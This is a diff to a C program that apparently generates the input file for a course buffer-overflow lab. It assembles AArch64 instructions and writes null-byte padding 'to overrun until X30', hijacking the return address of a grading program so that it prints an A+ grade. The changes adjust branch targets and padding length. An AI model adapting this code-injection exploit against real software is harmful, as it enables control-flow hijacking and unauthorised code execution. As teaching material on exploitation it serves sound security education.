@@ -45,8 +45,7 @@ int main(void)
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction bl printf("%c", 'A') */
-   /*uiInstr = MiniAssembler_bl(0x400600, 0x420064);*/
-   uiInstr = MiniAssembler_bl(0x400600, 0x420064);
+   uiInstr = MiniAssembler_bl(0x400600, 0x420068);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction mov w0, ‘+’ */
@@ -55,7 +54,7 @@ int main(void)
  
    /* Writes the instruction adr x1, grade */
    uiInstr = MiniAssembler_adr(1, 0x420044,
-   0x42006C);
+   0x420070);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction strb w0, [x1] */
@@ -63,12 +62,12 @@ int main(void)
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction b 0x400864 (call of printf) */
-   uiInstr = MiniAssembler_b(0x400864, 0x420074);
+   uiInstr = MiniAssembler_b(0x400864, 0x420078);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes enough null bytes to the dataAplus file
    to overrun until X30 */
-   for (i = 0; i<BUFSIZE-32; i++){
+   for (i = 0; i<BUFSIZE-36; i++){
        fprintf(psFile, "%c", 0x00);
    }
 
